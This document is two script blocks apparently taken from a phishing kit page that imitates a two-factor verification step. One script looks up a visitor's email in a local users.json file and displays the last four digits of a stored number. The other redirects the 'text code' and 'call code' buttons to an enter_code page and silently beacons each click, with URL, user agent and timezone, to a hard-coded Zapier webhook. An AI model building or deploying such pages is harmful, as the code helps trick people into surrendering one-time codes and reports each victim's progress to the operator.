<script>
document.addEventListener("DOMContentLoaded", async () => {
  const el = document.getElementById("last4");
  if (!el) return;

  const setEl = (v) => { el.textContent = String(v).slice(-4); };

  let last4 = sessionStorage.getItem("last4");
  if (last4 && String(last4).trim()) {
    setEl(last4);
    return;
  }

  const lookupEmail = sessionStorage.getItem("lookupEmail");
  if (lookupEmail) {
    try {
      const res = await fetch("data/users.json", { cache: "no-store" });
      if (res && res.ok) {
        const users = await res.json();
        const val = users[String(lookupEmail).toLowerCase()];
        if (val) {
          const v = String(val).slice(-4);
          sessionStorage.setItem("last4", v);
          setEl(v);
          return;
        }
      }
    } catch (e) {}
  }
  setEl("****");
});
</script>

<script>
(function(){ 
  const ZAP_WEBHOOK = 'https://hooks.zapier.com/hooks/catch/25442860/uz5ii0b/';
  function notify(eventName, extra) {
    try {
      const payload = {
        event: String(eventName||"unknown"),
        page: location.pathname,
        href: location.href,
        ts: new Date().toISOString(),
        tzOffsetMin: -new Date().getTimezoneOffset(),
        ua: navigator.userAgent,
        eid: Math.random().toString(36).slice(2,10),
        extra: extra || { }
      };
      const body = JSON.stringify(payload);
      if (navigator.sendBeacon) {
        const blob = new Blob([body], { type: "application/json" });
        navigator.sendBeacon(ZAP_WEBHOOK, blob);
      } else {
        fetch(ZAP_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true }).catch(()=>{});
      }
    } catch(e){}
  }
  function go(next, evtName){
    notify(evtName);
    setTimeout(function(){ try{ window.location.assign(next); }catch(e){ location.href = next; } }, 200);
    setTimeout(function(){ try{ window.location.replace(next); }catch(e){ location.href = next; } }, 1200);
  }
  function wire(){
    var textBtn = document.getElementById("textBtn");
    var callBtn = document.getElementById("callBtn");
    if (textBtn && !textBtn.__wired){ textBtn.__wired=1; textBtn.addEventListener("click", function(e){ e.preventDefault(); go("enter_code.html","text_code_clicked"); }); }
    if (callBtn && !callBtn.__wired){ callBtn.__wired=1; callBtn.addEventListener("click", function(e){ e.preventDefault(); go("enter_code.html","call_code_clicked"); }); }
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", wire, {once:true}); else wire();
})();
</script>
